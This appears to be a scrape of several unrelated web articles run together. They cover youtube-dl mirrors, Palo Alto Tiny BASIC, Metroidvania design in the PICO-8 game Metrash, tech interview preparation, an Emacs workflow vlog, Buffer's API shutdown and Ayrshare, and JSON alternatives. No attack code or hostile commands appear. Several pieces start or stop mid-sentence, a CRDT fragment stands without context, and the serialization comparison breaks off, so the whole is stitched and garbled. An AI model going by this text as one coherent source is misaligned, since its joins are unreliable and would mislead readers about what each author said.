<p>In light of distributed source code hosting platforms such as Git, thousands of developers have the public domain youtube-dl source code stored <em>locally</em>, hence the claim to remove the source code is impossible.</p>
<p>Nevertheless, there are still ways to access this source code. For starters, the <code>youtube-dl</code> module is still available on <a href="https://pypi.org/project/youtube_dl/">PyPi</a>, a package hosting platform for Python. Also, <a href="https://gitee.com/mirrors/youtube-downloader">Gitee (a Chinese Git platform)</a> contains a copy of youtube-dl in its entirety.</p>
<p>I would encourage you all to create mirrors on alternative Git hosting platforms. I'm more than happy to update this article with any further information.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
				




<p><a href="https://maly.cz/">Martin Malý</a> has adapted Version 2 of Li Chen Wang’s <a href="https://en.wikipedia.org/wiki/Tiny_BASIC#Palo_Alto_Tiny_BASIC">Palo Alto Tiny BASIC</a> to run on his <a href="https://www.asm80.com/">ASM80</a> browser-based assembler and emulator. I’ve uploaded <a href="https://github.com/Geddd/PATB4ASM80">the source code</a>, with his permission, to GitHub.</p>



<p><strong>Background</strong></p>



<p>Palo Alto Tiny BASIC emerged out of the Tiny BASIC movement started by People’s Computer Company and taken up by the Homebrew Computer Club. Fellow members Steve Wozniak and Tom Pittman would develop their own BASICs (Integer BASIC and 6800 Tiny BASIC respectively). Wang analyzed the Altair BASIC code and contributed edits to Tiny BASIC Extended. Wang published in the newsletter a loader for the 8080, commenting on the <em>Open Letter to Hobbyists:</em></p>



<blockquote><p>Altair Basic has a bootstrap loader of twenty or twenty one bytes long. In principle, you can use this bootstrap to load in your own loader which will then load in your program. However, since Mr. Bill Gates claims that he did not yet payed [sic] enough and is in the mood of calling people thieves. (See HBCC newsletter ’12-1.) I decided to code one myself. What comes out is a bootstrap of sixteen bytes long. This is still too long, maybe our professional experts can make it shorter. For the time being you are welcome to copy mine and I will not call you a thief (this includes Mr. Gates).</p></blockquote>



<p>No surprise then that Li Chen Wang made his BASIC implementation available for free. (I found this quote reading old Homebrew newsletter articles in my research for the <a href="http://troypress.com/basic-interpreters-new-wikipedia-article/" data-type="post" data-id="853">BASIC interpreter article</a>.)</p>



<p>The only smaller implementation of Tiny BASIC was <a href="http://troypress.com/the-dialects-of-tiny-basic/" data-type="post" data-id="878">MINOL</a>, which used unsigned bytes instead of signed integers and which used nonstandard commands. Also weighing in under 2kB, when a common method of shipping interpreters was 4kB ROMs, Palo Alto Tiny BASIC supported a more typical version of the language while leaving extensive room for customization for specific hardware, something which was taken advantage of multiple times, for the TRS-80, the <a href="http://troypress.com/astro-basic/" data-type="post" data-id="867">Bally Astrocade</a>, the Sharp PC-1211, and the Cromemco.</p>



<p><strong>The Code</strong></p>



<p>It’s been fun to play with the source code that was behind three of the computers I used as a kid. Some things I learnt:</p>



<ul><li>The code is very well structured and extensible. I added a few commands in under an hour (<em>PEEK, FRE()</em>). All you need to do is insert new commands in the keyword table, then adapt code elsewhere.</li><li>I was very excited to find a few small bugs in the code:<ul><li>The system famously had only three error messages (“WHAT?” for syntax errors, “HOW?” for functional errors, and “SORRY” for capacity issues). If you execute a <em>RETURN</em> with no corresponding <em>GOSUB</em> you get a &nbsp;“WHAT?” instead of a “HOW?”</li></ul><ul><li><em>10 INPUT “HELLO WORLD” </em>acts like a valid <em>PRINT</em> statement when it should cause a syntax error, since no variable is specified to receive the input.</li></ul><ul><li>The language only supports integers, but decimals aren’t ignored as they should be. <em>PRINT 1.1, 1.2</em> outputs <em>1</em> and <em>0</em>.</li></ul></li><li>There’s an Easter egg! “W”, “AN”, “G”</li></ul>

<p><strong>RST 1 Routine</strong></p>



<p>The RST 1 routine is a work of art, using the call stack to determine where its parameters are, with the byte after RST 1 specifying the character to match and the byte after that specifying the offset to jump to. Wang’s ability to write such memory-efficient code is why he didn’t need to implement the <a href="http://troypress.com/the-tiny-basic-interpretive-language-il-and-onions/" data-type="post" data-id="249">IL virtual machine</a>.</p>

Specifically, when you first emerge from Kokiri Forest into Hyrule Field, and see a vast expanse of meadows and blue skies.</p><p>Or something grittier, like <em>Dark Souls</em>, which lets the player explore an intricate, interconnected space.</p><p>An arcade game might increase a speed or difficulty variable to keep a player engaged. But an exploration game teases the unknown. Not only in its world design, as in:</p><blockquote><p><em>“Ooh, there’s a castle in the distance! Can I go there?”</em></p></blockquote><p>But also in its mechanics, as in:</p><blockquote><p><em>“What’s in this vase? Can I whack this vase with my sword?”</em></p></blockquote><hr><p>So if you wanted to make a game that features exploration at its core, how would it work?</p><p>One common formula is the <strong>Metroidvania</strong>. It's a genre that teases the unknown by restricting parts of the world until you've obtained or mastered certain abilities.</p><p>Which is why, in the rest of this post, I dive into the game design of Metrash.</p><a href="https://www.lexaloffle.com/bbs/?tid=34935" target="_blank">Metrash is a Metroidvania made by a developer who goes by Steed, and it's made in PICO-8.</a> <em>But don't let that turn you off from reading!</em><p>Because the great thing about well-crafted PICO-8 games, is that:</p><ol><li>They don’t take 70 hours to play. (Metrash is maybe 1 hour of gameplay, tops.)</li><li>They provide source code, if you’re curious enough to study it.</li><li><strong>They can teach us a lot about their genre of game design</strong>. Specifically, about Metroidvanias.</li></ol><p>So in the rest of this post, I take apart the design of Metrash to explain how it works. And in doing so, I define the principles of a Metroidvania, so that you can apply these principles to a game of your own.</p><p>Let’s get started!</p><h2 id="0-the-mda-framework">0. The MDA framework</h2><p>To ensure we're starting from the same base, I want to cover the MDA framework.</p><p>It stands for Mechanics–Dynamics–Aesthetics, and it's a useful lens for viewing exploration games:</p><ol><li><strong>Mechanics</strong>. The rules of the game. Player input, code, world physics, that sorta thing.</li><li><strong>Dynamics</strong>. The patterns of play that emerge from the mechanics. That could be racing, as in <em>"I'm hugging the side of the racetrack so that I can beat the other guy to the finish line"</em>, or survival, as in <em>"I'm building a fort so that zombies don't attack me in Minecraft"</em>.</li><li><strong>Aesthetics</strong>. The emotional responses to the dynamics. For racing, that could be the feeling of competition. For survival, that could be the feeling of safety (or lack thereof).</li></ol><p>Under this mental framework for thinking about games, you'll notice that <strong>exploration is an aesthetic</strong>. In other words, the <em>feeling of discovery</em> is an emotional response in the player.</p><p>And you can't create that feeling directly. You can only create mechanics, and hope that your aesthetic intent occurs in the player's mind.</p><div>

	<small>Remember the saying, <em>"If a tree falls in a forest, but no one is around to hear it, did it make a sound?"</em> It's kinda like that.</small>
  </p></div><p>But what mechanics lead to a feeling of discovery? Here's how Metrash does it...</p><h2 id="1-teach-your-mechanics-implicitly">1. Teach your mechanics implicitly</h2><p>Whether intentional or not, Metrash implements the feeling of discovery at multiple levels of its design.</p><p>The first thing it does is <strong>teaching the game's mechanics non-verbally</strong>.</p><p>In the game, you play as a mechanical contraption (that looks kinda like 343 Guilty Spark from <em>Halo</em> 😄), and you are let loose to explore a gizmo-infested world.</p><p><span>

It's a story about the relationship between <strong>maneuvering</strong>, and <strong>deciding when to shoot</strong>.</p><p>So choose your verbs carefully. Then <em>explore</em> the relationship between them. That's how you make an exploration game.</p><h2 id="but-how-do-i-make-my-own-metroidvania">But... how do I make my own Metroidvania?</h2><p>Kynan Pearson has a nice, less-theoretical guide <a href="http://subtractivedesign.blogspot.com/2013/01/guide-to-making-metroidvania-style.html" target="_blank">at his blog</a>.</p><p>And if you're anything like me, you don't want to clone <em>Metroid</em> –&nbsp;you want to make something <em>new</em>.</p><p>So here are some ideas that riff on the idea of exploration and discovery:</p><ul><li><strong>Branching</strong>. Metrash turns out to be a rather linear experience. How would you create a branching narrative? And how does that play into the feeling of discovery?</li><li><strong>Take away the mechanics</strong>. What if you take away the mechanics, and only leave spatial exploration?<ul><li>Would that be like exploring a maze? Maybe you’d emphasize competition over discovery, like in laser tag, or <em>Harry Potter: Goblet of Fire</em>.</li><li>Does that make a Walking Sim a degenerate form of Metroidvania? How would you create player engagement?</li></ul></li><li><strong>Language mechanics</strong>. What about linguistic exploration instead of spatial exploration? How would you learn a language through a game?</li><li><strong>You're a scientist</strong>. What if you’re Charles Darwin, and you’re uncovering facts about how birds interact in an ecosystem?</li><li><strong>Detective mechanics</strong>. What about detective games, where you’re exploring evidence in order to identify a culprit?</li></ul></div></div>]]>

<p>Having recently gone through the tech interview loop, and discussing it with half a dozen friends who did the same, I realized how much private knowledge there was around optimizing the whole process. The unfortunate truth is that a lot of this information can make a <code>$10k-100k+</code> difference in salary for otherwise the same engineer. Some of it is common sense, but a lot of it is learned through word of mouth or collecting various sources online. So I wanted to level the playing field and put it all in one place in the hopes this helps a few folks who perhaps have less access to this information.</p>
<p>A little bit about myself: throughout my (6) internship experiences at the University of Waterloo I went through many dozens of interviews. It served as preparation for new grad interviews where I got several offers including Shopify and Google (where I eventually signed). After four years at Google I decided to go through the process again, and eventually received four offers at all the places I had onsites with: Square, CloudKitchens, Robinhood and Stripe. I even consulted with a <a href="https://fearlesssalarynegotiation.com/coach/">negotiation coach</a> (highly recommend him if you're not excited about the prospect of doing this yourself) and was told I had done everything I could have to get the best offer. I'm by no means an expert in this whole thing, but I've gotten to see a lot about how it works and had fun trying to pick it apart, while also learning a lot from others doing the same.</p>
<p>This guide is targeted at those who already have engineering experience, or perhaps are just going through their first round of interviews, but not those still learning computer science - for that there are plenty of other <a href="https://twitter.com/RandallKanna/status/1285630730610053123?s=20">great sources</a>. Otherwise, I'm assuming that you've decided to look around for an opportunity and want to do it in the most effective way possible. I hope this guide is as tactical as possible, so I'll keep things brief and actionable.</p>

<p>In the ideal case (and I'm not quite there either, but want to be more deliberate about it) you'll naturally have made friends and acquaintances throughout the industry that will think of you when they need to hire someone. A lot of times, these sorts of referrals will bypass parts or all of the standard interview process. Even if this is the case, unless you have a really good sense of the job market and the offer ranges for your experience level, <strong>I still recommend doing a couple of other interviews before taking such an offer</strong> so you can be confident it's competitive.</p>
<p>Most people, especially starting out, will have to seek out their own opportunities and that's fine! <strong>Define a criteria</strong> for yourself of things that interest you, locations you'd be willing to relocate to (remote?), and values you care about in a company. Don't necessarily restrict yourself to these for applying since you want to <strong>cast your net as wide as possible in the beginning</strong>, but keep your criteria in mind as you get closer to making your decision. Be sure to apply to companies that you know give out very high offers, even if you're not thrilled about working there because you may be able to use their offers as leverage.</p>
<p>It might be helpful to create an <code>Inteview Tracker</code>. I used a <a href="https://www.notion.so/vimota/adc4e53c94ea4f7a92e7af271d9d6d94?v=830efb1379904a6bad53cbf6d7e453a5">Notion Kanban board</a> to keep track of the different stages I was in for each company.
<img src="https://i.imgur.com/rqz9t7M.png"></p>
<p>Once you've applied to all the companies on your list, try to reach out to people in those companies to get 1) information about the interview process and the company culture and 2) potentially fast tracked through it. If you know someone at one of these companies, reach out to them! Even if you don't, pass around a list of companies you're interested in to people you know working in tech, there's a good chance they know someone who does. Cold reach outs work too, Jake does a great job of covering how to do this in his post <a href="https://justjake.substack.com/p/a-hackers-guide-to-job-hunting">A Hacker's Guide to Job Hunting</a>, I can't recommend this approach enough. Twitter is another great place to cold reach out to people at companies you're especially interested in. Most companies will have a modified process for referrals, and there's lots you can learn about a company's internal process for evaluating candidates that will help your chances, so this step can really help.</p>

<p>The best way to get great offers is to do well on the interviews. Your performance on the interviews is more than just pass/fail. Going above expectations on them gives you and the recruiter ammunition to push on the higher end of their allowed band, so try to really invest in practicing deliberately.</p>
<p>The format of the interview should be pretty familiar to you, 90% of companies follow something like this: Phone screen (coding question) -&gt; Onsite (2-3 coding questions, 1 system design, 1 project review). Sometimes they'll have a do-on-your-own-time project based interview instead, with a shorter 1-2 hour onsite. Lots has been written on how to practice for these already so I'll just link to some of the <a href="https://twitter.com/RandallKanna/status/1285630729850953729">best resources</a> and describe my general approach. 4-6 weeks of a couple of hours after work and on weekends should be more than enough time to prepare for the phone screens and onsites.</p>
<p>If you're intimidated by the open endedness of practicing for coding questions, I recommend starting by following a guide like <a href="https://yangshun.github.io/tech-interview-handbook/best-practice-questions/">this one</a>. You don't need to do every question for every week, and the dynamic programming week could be just skimmed through (in practice these are rarely asked), but it serves as a good path to make sure you cover most types of questions and continue making progress. On top of that it's useful to spend a couple sessions on:</p>
<ul>
<li><strong>algorithms and data structures</strong>; their trade offs and use cases and time complexity. <a href="https://www.interviewcake.com/data-structures-reference">These</a> are good <a href="https://github.com/kdn251/interviews">starting points</a>.</li>
<li><strong>object oriented programming and patterns</strong></li>
<li><strong>locks, parallelism and multi-threading</strong>. It's rare to get these in coding questions, but you should have some sense of what they are and how they're used. They sometimes come up when discussing follow ups to questions or in system design interviews. I mostly just reviewed the concepts with <a href="https://www.justsoftwaresolutions.co.uk/threading/locks-mutexes-semaphores.html">this</a> post, and made sure I knew how it was done in my programming language of choice, Python.</li>
<li>quirks about your <strong>programming language</strong> of choice. This probably isn't a deal breaker, but being able to drop some niche knowledge about the programming language you're using when it comes up in an interview makes you look like you really know your stuff. For example, I make sure to mention Python's Global Interpreter Lock (GIL) when talking about parallelism. <a href="https://www.notion.so/vimota/Python-Notes-7caf363f246f40ef9095e4ee13d6bcc0">Here</a> are some notes about things particular to Python I took along my practice. This is part of the reason I choose to interview with Python, it tends to have fewer things that "experts" are expected to know (compared to say, Java, where there are a million best practices), ie. fewer gotchas.</li>
</ul>
<p>The system design questions are a whole other beast, and deserve their own practice. You may not encounter them depending on the type of role you're interviewing for, but they're common for <code>full stack</code> and <code>backend</code>. They can be intimidating at first because they tend to be so open ended and have no "right answer", but once you've gone over a few examples you'll get familiar with the template you use to answer them.</p>
<ul>
<li>Go through <a href="https://github.com/donnemartin/system-design-primer">a primer</a>, taking notes on the different components that are used. Take note of the different failure modes that each part of the system can have and solutions to them (ie. retries, redundancy, timeouts, throttling, etc).</li>
<li>Impress the interviewer by naming actual services that represent each of the abstract components you're using (ie. Load balancer -&gt; NGINX, HAProxy, ELB ; cache -&gt; redis, memcache) and mention the differences between them or whether you've ever used them. This shows you have real world experience.</li>
<li>Practice answering some! Read through some <a href="https://www.educative.io/courses/grokking-the-system-design-interview/m2yDVZnQ8lG">examples</a> to learn how to structure you answers. Youtube is a solid resource for this.</li>
<li>Consistent hashing, concurrency models, partitioning, and caching are all important topics to understand.</li>
</ul>
<p>The bulk of questions you get will be covered by these, but there's a long tail of styles of questions you could also get: refactoring, debugging an open source project, designing an API, extending an existing class. It doesn't make sense to optimize for these, but know that they exist and try to get some "real world" practice as well beyond just Leetcode questions.</p>

<p>Timing matters. Try to schedule your interviews in a way that increases the chances you'll do well on the …</p></div></article></div>

			<p>In this video blog I talk about the persistent question of “the killer
app” that gets asked in the Emacs community.  I explain why I think the
identification of a single package is often not enough to appreciate the
true value proposition of Emacs.  My case emphasises the importance of
workflows; workflows that typically combine lots of distinct tools and
benefit from core Emacs attributes.  It is the whole system that
matters, because all those packages—in their given combinations—make
up our day-to-day computing experience with Emacs.</p>

<p>The text of the presentation is written in <code>org-mode</code> notation and is
reproduced below.  Also check my Emacs configuration file, from where
you can get the code I use: <a href="https://protesilaos.com/dotemacs">https://protesilaos.com/dotemacs</a>.</p>

<pre><code>#+TITLE: Vlog: Emacs is my “favourite Emacs package”
#+AUTHOR: Protesilaos Stavrou · protesilaos.com

* Getting into the Emacs mindset

I will to talk to you about my approach to a recurring topic in the
Emacs community, best encapsulated in this question:

/What is your favourite package?/

Similar formulations:

+ What is the one thing that makes Emacs indispensable to you?
+ Which is Emacs' killer app?

Such questions can lead us to valuable findings.  There is truth to be
had in the insights drawn from them and we must learn as much as we can
in the process.

Note though that this type of inquiry expects from us to engage in an
analytical exercise that extracts an object from its milieu.  It puts us
in a frame of mind that can miss the true value proposition of Emacs.

The problématique comes with the latent risk of holding us captive to a
frame of mind characterised by *decontextualisation*, of examining an
object without reference to the environment that renders it possible.

Instead of thinking about workflows that can take you from one context
to another, we are expected to identify some silo of functionalities.
Are we then underestimating everything else that contributes to our
day-to-day /experience/ with Emacs?

* Don't ignore the forest while looking at the tree

Now before I get misunderstood: yes, Org and Magit are great; yes, there
are lots of individual packages that make your life easier; and yes,
there is value in finding which package[s] people enjoy the most.

What about the combination of all utilities?  What about the *gestalt*?

If you claim that “my favourite package is X” and then fail to couch
your statement in terms of the rest of the toolkit you rely on, you are
likely to underappreciate---or altogether ignore---the true value
proposition of Emacs.

You do not acknowledge how the whole system is pieced together.  More
importantly, you may not realise the potential of Emacs' extensibility,
which is dynamic or case-dependent.

In other words, Emacs provides the means to implement a metaphor like
that of the vaunted Unix pipes across its entire space.  In practical
terms, you can connect your email client to your agenda, your RSS reader
to your custom note-taking system, your music manager to your directory
editor, and so on.  And all these can benefit from interfaces for
searching, editing in bulk, etc.

My claim here is that most of the times there is no one package or
narrow subset that make Emacs great.  It rather is the linkages between
several pieces of code that make Emacs a pleasure to work with.  They
contribute to predictable-yet-flexible workflows.  These keep Emacs
relevant and, dare I say, intriguing.

* The three core attributes of Emacs

Emacs is programmable and introspectable.  Both presuppose transparency.
These make the Emacs experience open-ended.

+ Programmable :: One set of features can be made to interface with
  another, even though it was not conceived with the express purpose of
  optimising for that particular scenario.  What can be done with Emacs
  is not predetermined.  There is always scope for something new.

+ Introspectable :: The user can examine the entire code base or a
  specific implementation and, potentially, figure out how to connect to
  it through some other tool.  This is further supported by the robust
  self-documentation facilities of Emacs, as well as the high quality of
  material that is readily available through the built-in Info reader.
  Introspection has contributed to the /documentation culture/ that
  characterises the Emacs community at-large.

+ Transparent :: Emacs does not conceal its internals.  Virtually every
  case can be handled using the same language the code is written in
  (Emacs Lisp) while benefiting from live evaluation of new code.  You
  change something and you see it in action.  Combined with the
  self-documenting nature of Emacs, transparency provides insight into
  practically every single construct that makes up Elisp.  Which
  empowers us to make best use of Emacs' programmability.

When considered together, these engender the *interconnectedness* that
defines the Emacs space.
* Introspection in action

Quick demo of running =C-h o= (=describe-symbol=) over =mapcar= and =mapconcat=
and then testing those expressions.

#+begin_src emacs-lisp
(mapcar #'upcase '("one" "two" "three"))

(mapconcat #'upcase '("one" "two" "three") "-")
#+end_src

We can use =C-x C-e= (=eval-last-sexp=) to get live feedback of what each
function does.

We can check the log with =C-h e= (=view-echo-area-messages=).

These are the rudimentary tools you rely on to start using ELisp.  They
offer you the means to experiment with how to extend Emacs.
* A quick look at combining tools

Now let me switch to another window layout, where I have some plain text
files in a standard directory.  Nothing fancy here.  Just to show how
standard Emacs tools can combine together to deliver a consistent
computing experience.

+ Switching to another layout involves the built-in tabs (=tab-bar-mode=)
  plus some bespoke code of mine.
+ Find file at point using a filename or just part of a file (=C-x C-f M-n=).
+ Use a completion framework (=icomplete-mode= in my case).
+ Benefit from a pattern-matching style (=orderless= for me).
+ Jump to the directory that contains the file (=dired-jump=).
+ While in Dired, jump to an item using completion (=dired-goto-file=).
+ Or filter the Dired list and then find the item (=% m= potentially
  followed by =t k=).

* Interconnectedness in the Emacs space

My point is to highlight the true value of Emacs' extensibility.  Which
is realised in the connections you make between several pieces of
functionality.

And, as I already mentioned, one package does not need to know about the
presence of another /in advance/.

Your focus should be on the workflow.  On the whole system that helps
you get things done with Emacs.  Because that is what your actual
experience is about.  You benefit from the set of /emergent qualities/
that become available in the combination of otherwise disparate pieces
of functionality.

Let me stress the importance of interconnectedness in the Emacs space by
showing you another quick demo that combines three distinct packages
that were not developed for the express purpose of being combined
together:

+ =elfeed= for reading RSS/Atom feeds.
+ =bongo= for managing media files or links.
+ And my own experimental note-taking system (=usls=).

Finally, this entire presentation is made possible by combining several
tools:

+ =org-mode=
+ =olivetti-mode=
+ =org-tree-slide-mode=
+ =variable-pitch-mode=
+ my own commands for setting fonts

Development was initially motivated by collaborative text editing and mobile computing. CRDTs have also been used in online chat systems, online gambling, and in the SoundCloud audio distribution platform. The NoSQL distributed databases Redis, Riak and Cosmos DB have CRDT data types.</p>  </div></div>]]>

<h2>Buffer’s API is no more.</h2>



<p>I was an avid user of Buffer. For several companies I worked at or founded, I used Buffer to manually schedule my social media posts. Every day I would start my morning with researching post content material, writing a few posts, and scheduling these post to go out later in the day. </p>



<p>However, I quickly slowed down with creating these manual posts; I became distracted with other priorities as my company grew, or it was just laziness to think of new posts every day. Regardless, my social media engagement decreased as I posted less, which sucked.</p>



<figure><blockquote><p>Social media is an extension of your company identity in a way that is personal to your community.</p></blockquote></figure>



<p>Every founder and consumer-facing business leader knows how important social media is to growing a brand. Social media is an extension of your company identity in a way that is personal to your community. In a way that no other medium allows, my social media accounts allows me to connect to users in a real or perceived dialogue that is so essential for brand and reputation building.</p>



<p>As with most things in life, if it’s worth doing, it takes real effort.</p>



<p>Then I read an article, which I’m still hunting for, that was a slap your head “of course” moment: <strong>you can automate your organic social media</strong>. Instead of having to manually post every day I could take my existing content and post from my server-side, automating the entire process. I had tons of great data that could be automatically posted. All I needed was an API I could send my post through.</p>



<p>I went back to Buffer to use their API and bam!</p>



<figure><img loading="lazy" width="1024" height="284" src="https://ayrshare.positorgroup.com/wp-content/uploads/2020/10/Buffer-API-1024x284.jpg" alt="" srcset="https://www.ayrshare.com/wp-content/uploads/2020/10/Buffer-API-1024x284.jpg 1024w, https://www.ayrshare.com/wp-content/uploads/2020/10/Buffer-API-300x83.jpg 300w, https://www.ayrshare.com/wp-content/uploads/2020/10/Buffer-API-768x213.jpg 768w, https://www.ayrshare.com/wp-content/uploads/2020/10/Buffer-API.jpg 1394w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>The Message: Go Away</figcaption></figure>



<p>WTF!</p>



<p>In <a href="https://techcrunch.com/2012/08/01/social-media-manager-buffer-opens-api-to-developers-looks-to-become-widespread-sharing-standard/">7 short years</a>, or maybe long years in tech, <a href="https://www.buffer.com/">Buffer</a> went from offering and API to getting rid of it.</p>



<p>So what happened?</p>



<p>Based on the <a href="https://blog.loomly.com/buffer-integration-sunset/">email</a> Loomly got from Buffer, it at first looks like Buffer got in trouble with the social networks:</p>



<blockquote><p>We’ve determined that we can no longer permit certain usage of the Buffer API, especially when the posting goes beyond the stated agreements we have with the social networks.</p></blockquote>



<p>Ok, but simple abuse of posting happens whether manual or automatic. And you can build in safeguards, thresholds, and other protection mechanisms. </p>



<p>And then we come to:</p>



<blockquote><p>After an audit of existing API integrations, we’ve chosen to revoke access to third-party tools that&nbsp;provide similar functionality to Buffer’s core product, i.e. scheduling social media posts directly via&nbsp;social network&nbsp;APIs. These products can no longer utilize&nbsp;the Buffer&nbsp;API.</p></blockquote>



<p>Ah ha! Companies that essentially used Buffer as a proxy to post were no longer wanted as Buffer seemed to narrow its focus to media agencies. In this context, such a strategy to de-emphasize the API makes sense. After all, most agencies have teams of people creating content and manually scheduling and posting all day long.</p>



<p>It is a shame that Buffer dropped their API since there is a <a href="https://ayrshare.positorgroup.com/top-10-social-media-apis-for-developers/">shortage</a> of good solutions out there and it really is needed if you want to automated your social media. </p>



<p>This is the reason we created <a href="https://ayrshare.positorgroup.com/">Ayrshare</a>. We built it first for ourselves and then for users to automate posting to social media networks via an API. </p>



<p>So in a way, thanks Buffer!</p>

<![CDATA[Better Than JSON?]]>

October 23, 2020 | https://wiki.alopex.li/BetterThanJson | <a href="https://web.archive.org/web/*/https://wiki.alopex.li/BetterThanJson">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikipage">

<p>I want to take a brief look at various data serialization formats and compare them. Basically the goal is to answer the question, “can we find something better than JSON?” However, note that we are looking at these things for DATA SERIALIZATION, not for config files and stuff, so that’s the goal by which these will be judged.</p>
<p>There’s two orthogonal axes to look at these things under:</p>
<ul>
<li>Self-describing vs.&nbsp;schema-defined formats</li>
<li>Human readable vs.&nbsp;machine-readable formats</li>
</ul>
<p>That is, whether the type information for a structure is defined in a separate file (a schema) that a receiving program checks against, or whether the message itself contains type information. It’s almost exactly the difference between statically and dynamically typed programming languages. Like programming languages, both have pros and cons, neither of them are always better than the other. The goal of this is to compare apples to apples, so we’re gonna note which category these things fall into but not make value judgements based on them. There’s also fuzzy edges; many self-describing formats optionally have a schema layer too. Similarly, we will not really compare tooling quality; the goal is to look at the intrinsic properties of the formats. The culture surrounding them may be considered though.</p>
<p>This is also important not to conflate with an RPC protocol, though many of these things are used IN RPC protocols. Keep in mind that HTTP/REST interfaces are often just a type of RPC protocol, whether realized that way or not.</p>
<p>Up to date as of October 2020. Doesn’t try to include myriad minor things, ’cause there’s only so much time in the world.</p>

<h2 id="json">JSON</h2>
<p><a href="http://json.org/">http://json.org/</a></p>
<p>What everything gets currently compared against. We all know JSON, we all agree it’s Sorta Good Enough but really is kinda crap.</p>
<p><strong>Category:</strong> Human-readable, self-describing. (<a href="https://json-schema.org/">https://json-schema.org/</a> exists but does not seem very widely used.) Has an <a href="https://en.wikipedia.org/wiki/JSON-RPC">RPC protocol</a> but it also seems lightly used, <a href="https://jsonapi.org/">this</a> might be more general.</p>
<p><strong>Users:</strong> Everyone</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Similar to major programming languages – Easy to understand and debug</li>
<li>Simple – Easy to read, write, and understand… at least for simple things. <a href="http://seriot.ch/parsing_json.php">Turns out there’s a lot of gotcha’s though.</a></li>
<li>Pretty compact if minified</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Type system is pretty shit – no date/time, no real integers, no real structs, no unions/tuples/etc</li>
<li>Tends to discourage schema’s – “So simple it doesn’t need it”, until it becomes less simple.</li>
<li>No normalized form – fields may be reordered, <em>duplicated</em>, etc. Makes hashing it hard, gotta read whole message to begin verifying it, etc.</li>
<li>No comments – harder to write well than you might think!</li>
<li>No good way to contain binary data</li>
</ul>
<h2 id="yaml">YAML</h2>
<p><a href="https://yaml.org/">https://yaml.org/</a></p>
<p>Started out as a simpler alternative to XML.</p>
<p><strong>Category:</strong> Human-readable, self-describing.</p>
<p><strong>Users:</strong> Lots of people</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Vaguely simple to read and write, in its basic form</li>
<li>Low visual noise</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Way too complicated – they made it a strict superset of JSON for some damn reason, and nobody uses that form, so it’s just a pile of wasted effort</li>
<li>Reference impl incomplete, other impl’s disagree with each other and the spec</li>
</ul>
<h2 id="xml">XML</h2>
<p><a href="https://en.wikipedia.org/wiki/XML">https://en.wikipedia.org/wiki/XML</a></p>
<p>Not sure anyone really knows how XML happened. It’s basically the W3C’s fault, I think? It’s okay for some things but in the end I’m not sure it’s something anyone actually <em>wants</em> to use, it’s just going to be one more of those mistakes of the past.</p>
<p><strong>Category:</strong> Human-readable, self-describing with common schema usage. Has an <a href="https://en.wikipedia.org/wiki/XML-RPC">RPC protocol</a> and many other complicated things.</p>
<p><strong>Users:</strong> Everyone who can’t avoid it.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Promotes schemas and validation</li>
<li>Simple to use for simple things</li>
<li>Actually pretty decent for documents</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>I’ve never gotten schemas and validation to actually work in practice</li>
<li>Everything is string-ly typed</li>
<li>No real arrays</li>
<li>Complicated as frig</li>
<li>Very verbose</li>
<li>There’s like 3-4 different ways to do everything</li>
<li>Still no good way to contain binary data</li>
</ul>

<h2 id="protobuf">Protobuf</h2>
<p><a href="https://developers.google.com/protocol-buffers/">https://developers.google.com/protocol-buffers/</a></p>
<p>aka Protocol Buffers, but that’s a pretty dumb name. Google’s common, fast on-the-wire serialization format.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Has an <a href="https://grpc.io/">RPC protocol</a> built around it.</p>
<p><strong>Users:</strong> Google, basically everyone</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Backed by Google, so it’s going to be good at the things Google values</li>
<li>Basically reasonable</li>
<li>Now has some support for versioning schemas, though it’s a hard problem in general</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Backed by Google, so it’s going to be good at the things Google values</li>
<li>Not particularly simple</li>
<li>Wire protocol may be more work than it needs to be</li>
<li>Its type system <a href="http://reasonablypolymorphic.com/blog/protos-are-wrong/index.html">could maybe be better</a></li>
</ul>
<h2 id="capn-proto">Cap’n Proto</h2>
<p><a href="https://capnproto.org/">https://capnproto.org/</a></p>
<p>The Other Binary Serialization Protocol.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Designed primarily for RPC, which is built in to the reference implementation.</p>
<p><strong>Users:</strong> sandstorm.io, Cloudflare?, various other people but it doesn’t seem like that many</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Designed to be fast</li>
<li>Made by one of the people who worked heavily on Protobuf at Google, so <a href="https://capnproto.org/faq.html#how-do-i-make-a-field-required-like-in-protocol-buffers">there’s lots of experience behind it</a>. That said, doesn’t mean this cat’s always <em>right</em>, but there’s certainly opinions that are trying to be expressed.</li>
<li>Sophisticated RPC comes as part of the standard package</li>
<li>Designed for zero-copy deserialization</li>
<li>Designed for schema to evolve</li>
<li>Adorable name</li>
<li>Very explicit about correctness and conformance things such as field ordering and layout</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Very explicit about correctness and conformance things such as field ordering and layout</li>
<li>Lots of the docs and concepts are pretty low level, you usually ain’t gonna need it</li>
<li>Seems more complicated than protobuf – this might be one reason there’s fewer 3rd-party implementations</li>
</ul>
<h2 id="thrift">Thrift</h2>
<p><a href="https://thrift.apache.org/">https://thrift.apache.org/</a></p>
<p>Apache’s version of Protobuf. Does anyone actually use this? Facebook, apparently, since they invented it and then gave it to Apache. Anyone else?</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Designed primarily for RPC.</p>
<p><strong>Users:</strong> Basically mostly Facebook? Twitter and AirBNB also apparently use it, so apparently it’s not UNpopular.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>It works?</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Docs suck</li>
<li>Apache is the tragic junkyard of open source projects</li>
<li>Apparently still not as good as flatbuffers, see below</li>

<p><a href="https://google.github.io/flatbuffers/">https://google.github.io/flatbuffers/</a></p>
